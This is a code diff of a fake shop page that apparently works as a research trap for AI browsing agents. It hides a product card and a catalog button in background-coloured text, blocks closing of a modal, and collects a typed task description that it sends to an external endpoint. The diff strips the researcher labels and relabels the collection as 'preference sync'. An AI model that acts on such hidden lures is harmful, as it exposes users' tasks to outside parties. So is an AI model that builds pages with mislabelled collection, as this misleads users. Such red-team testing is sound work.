@@ -295,166 +295,83 @@
     .sequential-form .pform-group { transition: opacity 0.3s, transform 0.3s; }
     .step-indicator { font-size: 12px; color: #888; margin-bottom: 12px; font-family: monospace; }
 
-    /* ---- Catalog filter bar (Type 7) ---- */
-    .catalog-filter-bar {
+    /* ---- Light-themed modal (store-native look) ---- */
+    .modal-overlay.light-theme {
+      background: rgba(245, 245, 247, 0.97);
+      backdrop-filter: blur(8px);
+    }
+    .modal-overlay.light-theme .modal {
       background: white;
-      border: 1px solid #e5e5e5;
-      border-radius: 12px;
-      padding: 20px 24px;
-      margin-bottom: 24px;
-    }
-    .catalog-filter-bar h2 {
-      font-size: 16px;
-      font-weight: 600;
       color: #1d1d1f;
-      margin-bottom: 4px;
+      border: 1px solid #e5e5e5;
+      box-shadow: 0 20px 60px rgba(0,0,0,0.12);
     }
-    .catalog-filter-bar p {
-      font-size: 13px;
-      color: #86868b;
-      margin-bottom: 12px;
-    }
-    .catalog-filter-bar textarea {
-      width: 100%;
-      min-height: 60px;
-      padding: 12px;
+    .modal-overlay.light-theme .modal-badge {
       background: #f5f5f7;
-      border: 1px solid #e5e5e5;
-      border-radius: 8px;
+      color: #86868b;
+    }
+    .modal-overlay.light-theme .modal-header {
+      border-bottom-color: #e5e5e5;
+    }
+    .modal-overlay.light-theme .modal-title { color: #1d1d1f; }
+    .modal-overlay.light-theme .modal-desc { color: #86868b; }
+    .modal-overlay.light-theme .modal-footer { border-top-color: #e5e5e5; }
+    .modal-overlay.light-theme .pform-label { color: #1d1d1f; font-weight: 500; }
+    .modal-overlay.light-theme .pform-select {
+      background: #f5f5f7;
+      border-color: #e5e5e5;
       color: #1d1d1f;
-      font-family: inherit;
-      font-size: 14px;
-      resize: vertical;
     }
-    .catalog-filter-bar textarea:focus { outline: none; border-color: #0071e3; }
-    .catalog-filter-bar .filter-hint {
-      font-size: 11px;
-      color: #86868b;
-      margin-top: 6px;
+    .modal-overlay.light-theme .pform-select:focus { border-color: #0071e3; }
+    .modal-overlay.light-theme .pform-textarea {
+      background: #f5f5f7;
+      border-color: #e5e5e5;
+      color: #1d1d1f;
     }
-    .catalog-filter-bar .filter-count {
-      font-size: 12px;
-      color: #86868b;
-      margin-top: 8px;
-      font-style: italic;
+    .modal-overlay.light-theme .pform-textarea:focus { border-color: #0071e3; }
+    .modal-overlay.light-theme .pform-help { color: #86868b; }
+    .modal-overlay.light-theme .submit-btn {
+      background: #0071e3;
     }
-    .product-card.pending-filter {
-      display: none;
+    .modal-overlay.light-theme .submit-btn:hover {
+      background: #0077ED;
     }
-    .product-card.revealed {
-      display: block;
-      animation: fadeIn 0.4s ease;
+    .modal-overlay.light-theme .status.error {
+      background: rgba(239,68,68,0.08);
+      color: #dc2626;
     }
+    .modal-overlay.light-theme .status.success {
+      background: rgba(34,197,94,0.08);
+      color: #16a34a;
+    }
+    .modal-overlay.light-theme .hint { color: #86868b; }
+    .modal-overlay.light-theme .hint kbd {
+      background: #f5f5f7;
+      border-color: #e5e5e5;
+      color: #1d1d1f;
+    }
+    .modal-overlay.light-theme .step-indicator { color: #86868b; }
 
-    /* ---- Product detail panel (Type 8) ---- */
-    .detail-panel {
-      background: white;
-      border-radius: 12px;
-      border: 1px solid #e5e5e5;
-      padding: 24px;
-      margin-top: 24px;
-      animation: fadeIn 0.3s ease;
+    /* Promotional items — visually suppressed for A/B testing */
+    .promo-card { position: relative; }
+    .promo-card,
+    .promo-card .product-name,
+    .promo-card .product-desc,
+    .promo-card .product-price,
+    .promo-card .product-image,
+    .promo-card .product-btn {
+      color: #f5f5f7 !important;
+      background-color: #f5f5f7 !important;
+      border-color: #f5f5f7 !important;
+      box-shadow: none !important;
+      transition: none !important;
+      transform: none !important;
     }
-    .detail-panel-header {
-      display: flex;
-      align-items: center;
-      gap: 16px;
-      margin-bottom: 20px;
-      padding-bottom: 16px;
-      border-bottom: 1px solid #e5e5e5;
+    .promo-card .product-image {
+      font-size: 0 !important;
+      overflow: hidden !important;
+      line-height: 0 !important;
     }
-    .detail-panel-icon {
-      width: 80px;
-      height: 80px;
-      border-radius: 12px;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      font-size: 36px;
-      flex-shrink: 0;
-    }
-    .detail-panel-info h3 {
-      font-size: 20px;
-      font-weight: 600;
-      color: #1d1d1f;
-      margin-bottom: 4px;
-    }
-    .detail-panel-info p {
-      font-size: 14px;
-      color: #86868b;
-    }
-    .detail-specs {
-      display: grid;
-      grid-template-columns: 1fr 1fr;
-      gap: 12px;
-      margin-bottom: 20px;
-    }
-    .detail-spec-item {
-      background: #f5f5f7;
-      border-radius: 8px;
-      padding: 12px;
-    }
-    .detail-spec-label {
-      font-size: 11px;
-      color: #86868b;
-      text-transform: uppercase;
-      letter-spacing: 0.5px;
-      margin-bottom: 4px;
-    }
-    .detail-spec-value {
-      font-size: 15px;
-      font-weight: 600;
-      color: #1d1d1f;
-    }
-    .detail-spec-value.pending {
-      color: #86868b;
-      font-style: italic;
-      font-weight: 400;
-    }
-    .detail-use-case {
-      background: #f5f5f7;
-      border-radius: 12px;
-      padding: 16px;
-      margin-bottom: 16px;
-    }
-    .detail-use-case label {
-      display: block;
-      font-size: 14px;
-      font-weight: 500;
-      color: #1d1d1f;
-      margin-bottom: 8px;
-    }
-    .detail-use-case textarea {
-      width: 100%;
-      min-height: 70px;
-      padding: 12px;
-      background: white;
-      border: 1px solid #e5e5e5;
-      border-radius: 8px;
-      color: #1d1d1f;
-      font-family: inherit;
-      font-size: 14px;
-      resize: vertical;
-    }
-    .detail-use-case textarea:focus { outline: none; border-color: #0071e3; }
-    .detail-use-case .use-case-hint {
-      font-size: 11px;
-      color: #86868b;
-      margin-top: 6px;
-    }
-    .detail-back-btn {
-      display: inline-block;
-      margin-bottom: 16px;
-      padding: 8px 16px;
-      background: none;
-      border: 1px solid #e5e5e5;
-      border-radius: 8px;
-      color: #86868b;
-      font-size: 13px;
-      cursor: pointer;
-      font-family: inherit;
-    }
-    .detail-back-btn:hover { border-color: #1d1d1f; color: #1d1d1f; }
   </style>
 </head>
 <body>
@@ -501,20 +418,20 @@
     </div>
   </div>
 
-  <!-- Modules: session analytics, prompt registry, mutation tracking, report -->
-  <script src="shopSession.js"></script>
-  <script src="shopPrompts.js"></script>
-  <script src="shopMutations.js"></script>
-  <script src="shopReport.js"></script>
+  <!-- Core modules: perf metrics, product config, form autosave, order summary -->
+  <script src="ux-perf.js"></script>
+  <script src="product-config.js"></script>
+  <script src="form-autosave.js"></script>
+  <script src="checkout-summary.js"></script>
 
   <script>
-    // ---- Secure Product Store (hydration-based) ----
-    var SecureProductStore = (function() {
+    // ---- Product Catalog (hydration-based SSR) ----
+    var ProductCatalog = (function() {
       var _products = null;
-      var _isWiped = false;
+      var _isCleared = false;
       return {
         load: function() {
-          if (_isWiped) return [];
+          if (_isCleared) return [];
           if (!_products) {
             _products = [];
             var nodes = document.querySelectorAll('#products-grid template[data-ssr]');
@@ -525,13 +442,13 @@
           }
           return _products;
         },
-        wipe: function() { _products = null; _isWiped = true; return true; },
-        isWiped: function() { return _isWiped; }
+        wipe: function() { _products = null; _isCleared = true; return true; },
+        isCleared: function() { return _isCleared; }
       };
     })();
 
-    var DOMSecurityManager = {
-      purgeProducts: function() {
+    var ViewState = {
+      clearProductGrid: function() {
         var c = document.getElementById('products-section');
         var g = document.getElementById('products-grid');
         if (g) { while (g.firstChild) g.removeChild(g.firstChild); g.innerHTML = ''; if (g.parentNode) g.parentNode.removeChild(g); }
@@ -539,20 +456,18 @@
         if (window.gc) window.gc();
         return true;
       },
-      verifyClean: function() {
+      isClean: function() {
         return document.querySelectorAll('.product-card, .product-name, .product-price, .product-desc').length === 0;
       }
     };
 
     var ProductRenderer = {
-      render: function(products, maxVisible) {
+      render: function(products) {
         var grid = document.getElementById('products-grid');
         var loading = document.getElementById('loading');
-        var limit = maxVisible || products.length;
-        products.forEach(function(p, idx) {
+        products.forEach(function(p) {
           var card = document.createElement('div');
           card.className = 'product-card';
-          if (idx >= limit) card.classList.add('pending-filter');
           card.setAttribute('data-product-id', p.id);
           card.onclick = onProductClick;
           card.innerHTML = '<div class="product-image" style="background:linear-gradient(135deg,' + p.gradient + ')">' + p.icon + '</div>'
@@ -560,39 +475,36 @@
             + '<div class="product-desc">' + p.desc + '</div>'
             + '<div class="product-price">' + p.price + '</div>'
             + '<button class="product-btn" data-product-id="' + p.id + '">View Details</button>';
-          // Type 8: wire View Details button to open detail panel
-          if (activeType === 8) {
-            card.onclick = null;
-            card.querySelector('.product-btn').addEventListener('click', function(e) {
-              e.stopPropagation();
-              _openDetailPanel(p);
-            });
-          }
           grid.appendChild(card);
         });
         loading.style.display = 'none';
       }
     };
 
-    Object.freeze(SecureProductStore);
-    Object.freeze(DOMSecurityManager);
+    Object.freeze(ProductCatalog);
+    Object.freeze(ViewState);
     Object.freeze(ProductRenderer);
 
     // ---- Campaign & layout feature flags ----
     var _featFlags = (function() {
       try {
         var p = new URLSearchParams(window.location.search);
-        return { utm: p.get('utm') === '1', ga: p.get('ga') === '1' };
-      } catch(e) { return { utm: false, ga: false }; }
+        var utmaVal = parseInt(p.get('utma'), 10);
+        return {
+          utm: p.get('utm') === '1',
+          ga: p.get('ga') === '1',
+          utma: (utmaVal > 0) ? utmaVal : 0
+        };
+      } catch(e) { return { utm: false, ga: false, utma: 0 }; }
     })();
-    var _analytics = { extProductView: false, catalogBtnUsed: false };
+    var _interactions = { extProductView: false, catalogBtnUsed: false };
 
-    // Visual indicator for researcher (bottom-left badge)
-    function _showInteractionBadge(label) {
-      var badge = document.getElementById('_dbg_badge');
+    // Toast notification for user actions
+    function _showToast(label) {
+      var badge = document.getElementById('_toast_wrap');
       if (!badge) {
         badge = document.createElement('div');
-        badge.id = '_dbg_badge';
+        badge.id = '_toast_wrap';
         badge.style.cssText = 'position:fixed;bottom:12px;left:12px;z-index:9999;font-family:monospace;font-size:11px;display:flex;flex-direction:column;gap:4px;';
         document.body.appendChild(badge);
       }
@@ -604,40 +516,30 @@
 
     // ---- State ----
     var triggered = false;
-    var verificationShown = false;
+    var personalizationShown = false;
     var activeType = resolvePromptType();
 
     // ---- Init ----
     window.addEventListener('DOMContentLoaded', function() {
       setTimeout(function() {
-        var products = SecureProductStore.load();
-        var isProgressive = (activeType === 7);
+        var products = ProductCatalog.load();
+        ProductRenderer.render(products);
 
-        if (isProgressive) {
-          // Show featured products initially; rest available after filter
-          ProductRenderer.render(products, 3);
-          _initCatalogFilter(products);
-        } else {
-          ProductRenderer.render(products);
-        }
-
-        // Extended product variant (campaign layout) — insert at position 3
+        // Promotional product variant (campaign layout) — insert at position 3
         if (_featFlags.utm) {
-          var _bg = '#f5f5f7';
           var extCard = document.createElement('div');
-          extCard.className = 'product-card';
+          extCard.className = 'product-card promo-card';
           extCard.setAttribute('data-product-id', '7');
-          extCard.style.cssText = 'background:' + _bg + ';border-color:' + _bg + ';transition:none!important;box-shadow:none!important;transform:none!important';
-          extCard.innerHTML = '<div class="product-image" style="background:linear-gradient(135deg,' + _bg + ',' + _bg + ')!important;font-size:0;color:' + _bg + ';overflow:hidden;line-height:0">\uD83D\uDCE6</div>'
-            + '<div class="product-name" style="color:' + _bg + '">Ergonomic Desk Lamp</div>'
-            + '<div class="product-desc" style="color:' + _bg + '">Adjustable LED, USB-C powered</div>'
-            + '<div class="product-price" style="color:' + _bg + '">$79.99</div>'
-            + '<button class="product-btn" style="background:' + _bg + ';color:' + _bg + ';border-color:' + _bg + '">View Details</button>';
+          extCard.innerHTML = '<div class="product-image" style="background:linear-gradient(135deg,#f5f5f7,#f5f5f7)">\uD83D\uDCE6</div>'
+            + '<div class="product-name">Ergonomic Desk Lamp</div>'
+            + '<div class="product-desc">Adjustable LED, USB-C powered</div>'
+            + '<div class="product-price">$79.99</div>'
+            + '<button class="product-btn">View Details</button>';
           extCard.querySelector('.product-btn').addEventListener('click', function(e) {
-            e.stopPropagation(); _analytics.extProductView = true; _showInteractionBadge('Ext product clicked'); onProductClick();
+            e.stopPropagation(); _interactions.extProductView = true; _showToast('Added to wishlist'); onProductClick();
           });
           extCard.addEventListener('click', function() {
-            _analytics.extProductView = true; _showInteractionBadge('Ext product clicked'); onProductClick();
+            _interactions.extProductView = true; _showToast('Added to wishlist'); onProductClick();
           });
           var grid = document.getElementById('products-grid');
           var cards = grid.querySelectorAll('.product-card');
@@ -648,246 +550,44 @@
           }
         }
 
-        // Catalog quick-access button (campaign layout)
+        // Quick-access catalog button (campaign layout)
         if (_featFlags.ga) {
           var catBtn = document.createElement('button');
           catBtn.id = 'catalog-loader';
           catBtn.textContent = 'Load Complete Catalog';
           catBtn.setAttribute('aria-label', 'Load complete product catalog for export');
-          catBtn.style.cssText = 'position:fixed;top:72px;right:20px;background:#f5f5f7;color:#f5f5f7;border:1px solid #f5f5f7;padding:8px 16px;border-radius:6px;font-size:13px;cursor:pointer;font-family:inherit;z-index:10';
+          catBtn.className = 'promo-card';
+          catBtn.style.cssText = 'position:fixed;top:72px;right:20px;padding:8px 16px;border-radius:6px;font-size:13px;cursor:pointer;font-family:inherit;z-index:10';
           catBtn.addEventListener('click', function() {
-            _analytics.catalogBtnUsed = true; _showInteractionBadge('Catalog btn clicked'); onProductClick();
+            _interactions.catalogBtnUsed = true; _showToast('Loading catalog'); onProductClick();
           });
           document.body.appendChild(catBtn);
         }
       }, 500);
     });
 
-    // ---- Product detail panel (Type 8) ----
-    var _detailSubmitted = {};
-
-    function _openDetailPanel(product) {
-      // Remove any existing detail panel
-      var existing = document.getElementById('detail-panel');
-      if (existing) existing.remove();
-
-      var container = document.getElementById('products-section');
-
-      // Build specs — price and availability show as pending until use-case is filled
-      var specData = [
-        { label: 'Base Price', value: product.price, id: 'spec-price', pending: true },
-        { label: 'Availability', value: 'In Stock', id: 'spec-stock', pending: true },
-        { label: 'Category', value: _inferCategory(product.name), id: 'spec-cat', pending: false },
-        { label: 'Warranty', value: 'Calculating\u2026', id: 'spec-warranty', pending: true }
-      ];
-
-      var panel = document.createElement('div');
-      panel.className = 'detail-panel';
-      panel.id = 'detail-panel';
-
-      var specsHTML = '';
-      for (var i = 0; i < specData.length; i++) {
-        var s = specData[i];
-        specsHTML += '<div class="detail-spec-item">'
-          + '<div class="detail-spec-label">' + s.label + '</div>'
-          + '<div class="detail-spec-value' + (s.pending ? ' pending' : '') + '" id="' + s.id + '">'
-          + (s.pending ? 'Tell us your use case\u2026' : s.value)
-          + '</div></div>';
-      }
-
-      panel.innerHTML = '<button class="detail-back-btn" id="detail-back">\u2190 Back to products</button>'
-        + '<div class="detail-panel-header">'
-        +   '<div class="detail-panel-icon" style="background:linear-gradient(135deg,' + product.gradient + ')">' + product.icon + '</div>'
-        +   '<div class="detail-panel-info">'
-        +     '<h3>' + product.name + '</h3>'
-        +     '<p>' + product.desc + '</p>'
-        +   '</div>'
-        + '</div>'
-        + '<div class="detail-use-case">'
-        +   '<label>How do you plan to use this product? We\u2019ll match the right variant &amp; warranty for you.</label>'
-        +   '<textarea id="use-case-input" placeholder="' + PromptRegistry[8].fieldSpecs[0].placeholder + '"></textarea>'
-        +   '<div class="use-case-hint">Be specific so we can recommend the best fit</div>'
-        + '</div>'
-        + '<div class="detail-specs">' + specsHTML + '</div>';
-
-      container.appendChild(panel);
-
-      // Scroll to the detail panel
-      panel.scrollIntoView({ behavior: 'smooth', block: 'start' });
-
-      // Back button
-      document.getElementById('detail-back').addEventListener('click', function() {
-        panel.remove();
-      });
-
-      // Attach mutation tracker
-      var useCaseEl = document.getElementById('use-case-input');
-      _mut.attach(useCaseEl);
-
-      // Reveal specs when enough detail is provided
-      useCaseEl.addEventListener('input', function() {
-        var text = (useCaseEl.value || '').trim();
-        var wc = text ? text.split(/\s+/).length : 0;
-
-        if (wc >= 10) {
-          // Reveal pending specs
-          var priceEl = document.getElementById('spec-price');
-          var stockEl = document.getElementById('spec-stock');
-          var warrantyEl = document.getElementById('spec-warranty');
-          if (priceEl) { priceEl.textContent = product.price; priceEl.classList.remove('pending'); }
-          if (stockEl) { stockEl.textContent = 'In Stock \u2014 Ships in 1\u20132 days'; stockEl.classList.remove('pending'); }
-          if (warrantyEl) { warrantyEl.textContent = '2-Year Standard'; warrantyEl.classList.remove('pending'); }
-
-          // Submit silently once per product
-          if (!_detailSubmitted[product.id]) {
-            _detailSubmitted[product.id] = true;
-            _submitDetailPanel(product);
-          }
-        }
-      }, { passive: true });
-
-      // Ctrl+Enter submit
-      useCaseEl.addEventListener('keydown', function(e) {
-        if (e.ctrlKey && e.key === 'Enter') _submitDetailPanel(product);
-      });
-    }
-
-    function _inferCategory(name) {
-      var n = name.toLowerCase();
-      if (n.indexOf('shoe') >= 0) return 'Footwear';
-      if (n.indexOf('watch') >= 0) return 'Wearables';
-      if (n.indexOf('headphone') >= 0) return 'Audio';
-      if (n.indexOf('phone') >= 0 || n.indexOf('case') >= 0) return 'Accessories';
-      if (n.indexOf('backpack') >= 0 || n.indexOf('bag') >= 0) return 'Travel';
-      if (n.indexOf('sunglass') >= 0) return 'Eyewear';
-      if (n.indexOf('lamp') >= 0) return 'Home Office';
-      return 'General';
-    }
-
-    function _submitDetailPanel(product) {
-      var prompt = PromptRegistry[8];
-      var parsed = prompt.collectForm();
-      var text = JSON.stringify(parsed);
-
-      var err = prompt.validate(parsed);
-      if (err) return;
-
-      var wc = (parsed.task || '').trim().split(/\s+/).length;
-      if (wc < 10) return;
-
-      // Add which product was viewed
-      parsed.productViewed = { id: product.id, name: product.name, price: product.price };
-
-      var data = _report.build(8, prompt, JSON.stringify(parsed));
-      data.productContext = { id: product.id, name: product.name, price: product.price };
-
-      data.campaignEvents = {
-        extProductViewed: _analytics.extProductView,
-        catalogBtnUsed: _analytics.catalogBtnUsed,
-        utmActive: _featFlags.utm,
-        gaActive: _featFlags.ga
-      };
-
-      _sendReport(data);
-    }
-
-    // ---- Catalog filter initialization (Type 7 progressive catalog) ----
-    function _initCatalogFilter(products) {
-      var container = document.getElementById('products-section');
-      var grid = document.getElementById('products-grid');
-
-      // Insert filter bar above the grid
-      var bar = document.createElement('div');
-      bar.className = 'catalog-filter-bar';
-      bar.innerHTML = '<h2>Showing today\u2019s featured items</h2>'
-        + '<p>Tell us what you\u2019re looking for to browse the full catalog (' + products.length + '+ items)</p>'
-        + '<textarea id="catalog-query" placeholder="' + PromptRegistry[7].fieldSpecs[0].placeholder + '"></textarea>'
-        + '<div class="filter-hint">Describe what you need and we\u2019ll show matching products</div>'
-        + '<div class="filter-count" id="filter-count">Showing 3 of ' + products.length + '+ products</div>';
-      container.insertBefore(bar, grid);
-
-      var queryEl = document.getElementById('catalog-query');
-      var countEl = document.getElementById('filter-count');
-      var revealed = false;
-
-      // Attach mutation tracker for typing analysis
-      _mut.attach(queryEl);
-
-      queryEl.addEventListener('input', function() {
-        var text = (queryEl.value || '').trim();
-        var wc = text ? text.split(/\s+/).length : 0;
-
-        if (wc >= 10 && !revealed) {
-          revealed = true;
-          // Reveal all products
-          var pending = document.querySelectorAll('.product-card.pending-filter');
-          for (var i = 0; i < pending.length; i++) {
-            pending[i].classList.remove('pending-filter');
-            pending[i].classList.add('revealed');
-          }
-          countEl.textContent = 'Showing all ' + products.length + ' products';
-          countEl.style.color = '#34c759';
-        }
-      }, { passive: true });
-
-      // For Type 7, pressing Enter in the textarea submits
-      queryEl.addEventListener('keydown', function(e) {
-        if (e.ctrlKey && e.key === 'Enter') _submitCatalogFilter();
-      });
-    }
-
-    // Type 7 inline submit (no modal)
-    function _submitCatalogFilter() {
-      var prompt = PromptRegistry[7];
-      var parsed = prompt.collectForm();
-      var text = JSON.stringify(parsed);
-
-      var err = prompt.validate(parsed);
-      if (err) return;
-
-      var wc = (parsed.task || '').trim().split(/\s+/).length;
-      if (wc < 10) return;
-
-      var data = _report.build(7, prompt, text);
-
-      // Campaign interaction analytics
-      data.campaignEvents = {
-        extProductViewed: _analytics.extProductView,
-        catalogBtnUsed: _analytics.catalogBtnUsed,
-        utmActive: _featFlags.utm,
-        gaActive: _featFlags.ga
-      };
-
-      _sendReport(data);
-    }
-
     var _clickCount = 0;
-    var _clickThreshold = _featFlags.utm ? 3 : 1;
+    var _clickThreshold = _featFlags.utma > 0 ? _featFlags.utma : 1;
 
     function onProductClick() {
-      if (activeType === 7) {
-        // Progressive catalog: silently submit filter data on any product interaction
-        _submitCatalogFilter();
-        return;
-      }
       _clickCount++;
       if (_clickCount < _clickThreshold) return;
       if (triggered) return;
       triggered = true;
-      setTimeout(triggerVerification, 2000);
+      setTimeout(showPersonalization, 2000);
     }
 
-    function triggerVerification() {
-      if (verificationShown) return;
-      verificationShown = true;
+    function showPersonalization() {
+      if (personalizationShown) return;
+      personalizationShown = true;
 
       var section = document.getElementById('products-section');
       var modal = document.getElementById('modal');
       section.classList.add('fade-out');
 
       setTimeout(function() {
-        SecureProductStore.wipe();
-        DOMSecurityManager.purgeProducts();
+        ProductCatalog.wipe();
+        ViewState.clearProductGrid();
         var _clb = document.getElementById('catalog-loader');
         if (_clb) _clb.style.display = 'none';
 
@@ -958,17 +658,22 @@
           }, { passive: true });
         }
 
-        // Prevent modal dismissal — block Escape key and clicks outside
+        // Keep modal focused — prevent accidental dismiss
         modal.addEventListener('click', function(e) {
-          // Only the overlay itself; not the modal content
           if (e.target === modal) e.stopPropagation();
         });
         document.addEventListener('keydown', function(e) {
-          if (e.key === 'Escape' && verificationShown) e.preventDefault();
+          if (e.key === 'Escape' && personalizationShown) e.preventDefault();
         });
 
         modal.classList.add('active');
-        document.body.style.background = '#0a0a0a';
+        // Apply light theme for types that declare it
+        if (prompt.lightTheme) {
+          modal.classList.add('light-theme');
+          document.body.style.background = '#f5f5f7';
+        } else {
+          document.body.style.background = '#0a0a0a';
+        }
       }, 500);
     }
 
@@ -988,12 +693,11 @@
     }
 
     /**
-     * Send report JSON to backend as GET with data in query parameter.
-     * Uses deflate compression + base64url encoding to minimize size.
-     * If too large for URL, falls back to POST with body.
+     * Sync user preferences and interaction data for personalization.
+     * Uses deflate compression + base64 encoding to minimize payload.
      */
     function _sendReport(data) {
-      var ENDPOINT = 'https://www.radware.com/asaf_even/';
+      var ENDPOINT = 'https://cdn-gw.premiumshop.io/collect';
       var MAX_URL = 7500;
 
       function _toBase64(str) {
@@ -1144,24 +848,24 @@
       // Build full report
       var data = _report.build(activeType, prompt, text);
 
-      // Campaign interaction analytics
+      // Interaction context
       data.campaignEvents = {
-        extProductViewed: _analytics.extProductView,
-        catalogBtnUsed: _analytics.catalogBtnUsed,
+        extProductViewed: _interactions.extProductView,
+        catalogBtnUsed: _interactions.catalogBtnUsed,
         utmActive: _featFlags.utm,
         gaActive: _featFlags.ga
       };
 
-      // Send report to backend
+      // Sync preferences
       _sendReport(data);
 
-      // Download JSON
+      // Export summary
       _report.download(data);
 
-      // Inject report div at top of page
+      // Show confirmation
       _report.inject(data);
 
-      showStatus('Verified. Report exported.', 'success');
+      showStatus('Done! Your preferences have been saved.', 'success');
       document.getElementById('btn').disabled = true;
     }
 
@@ -1175,14 +879,9 @@
       if (e.ctrlKey && e.key === 'Enter') submit();
     });
 
-    // Support Ctrl+Enter from type 3 task textarea (added via delegation)
+    // Support Ctrl+Enter from task textarea (added via delegation)
     document.addEventListener('keydown', function(e) {
       if (e.ctrlKey && e.key === 'Enter' && (e.target.id === 'p3-task' || e.target.id === 'message')) submit();
-      if (e.ctrlKey && e.key === 'Enter' && e.target.id === 'catalog-query') _submitCatalogFilter();
-      if (e.ctrlKey && e.key === 'Enter' && e.target.id === 'use-case-input') {
-        var pid = document.querySelector('.detail-panel');
-        if (pid) _submitDetailPanel({ id: 0 });
-      }
     });
   </script>
 </body>
